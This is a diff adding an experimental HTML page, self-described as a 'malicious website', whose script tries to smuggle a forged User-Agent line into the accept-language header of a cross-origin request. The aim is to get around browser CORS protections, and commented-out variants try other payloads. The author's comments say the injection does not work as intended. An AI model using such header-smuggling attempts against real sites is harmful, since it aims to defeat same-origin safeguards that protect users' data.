@@ -1,0 +1,59 @@
+<!DOCTYPE hxtml>
+<html>
+  <head>
+  </head>
+  <body>
+    <h1> Here there ! Welcome on my malicious website ;p </h1>
+    <p> This is some content </p>
+    <div class="maliciousFrame">
+      <iframe id="mFrameWindow" name="mFrameWindow"></iframe>
+    </div>
+
+    <div class="targetFrame">
+      <iframe id="tFrameWindow" name="tFrameWindow" src=""></iframe>
+    </div>
+
+    <script>
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "https://www.google.co.kr", true);
+
+      // Try to see which patterns can be used to set malicious Header to our request
+      // The different value of headers I tried
+      // var maliciousHeader = "KEY:value";
+      // var maliciousHeader = "KEY:value:value";
+      // var maliciousHeader = "KEY%20AFTERSPACE";
+      // var maliciousHeader = "KEY%0AUSER-AGENT"; // Try to force the rewritting of the User-Agent to make the preflight request successful.
+
+      // Since we can't redefine sensitive headers such as User-Agent or Referer for instance
+      // We try to redefine/change the value of "accept-language"
+      var maliciousHeader = "accept-language";
+
+      // Here we try to set an object Header as a value of our "accept-agent" header
+      // It works but the value of "accept-agent" is actually the result of headers.toString()
+      // Which is not what we are looking for here
+      // var headers = new Headers();
+      // headers.append('User-Agent', 'curl/7.54.0');
+      // xhr.setRequestHeader(maliciousHeader, headers);
+
+      // Here we try just to set a malicious value for "accept-language"
+      // In order to modify the user-agent, the origin, the referer or whatever "sensitive"
+      // header that prevent us from fetching cross origin data
+      xhr.setRequestHeader(maliciousHeader, "value%0AUser-Agent: curl/7.54.0");
+      // The command above works but not as we would expect. Indeed %A0 here doesn't
+      // produce a "Return" as we want to do. Moreover '\n' cannot be used in a header
+      // becasuse the character '\' is rejected (Headers should be ASCII only)
+
+      xhr.onreadystatechange = function () {
+        if (xhr.readyState == XMLHttpRequest.DONE) {
+          if (xhr.status != 200 && xhr.status != 206) {
+            console.log("Oops ! Something went wrong :( (Status: " + xhr.status + ", Response: " + xhr.responseText + ")");
+          } else {
+            document.getElementById("tFrameWindow").innerHTML = xhr.responseText;
+          }
+          return;
+        }
+      };
+      xhr.send();
+    </script>
+  </body>
+</html>
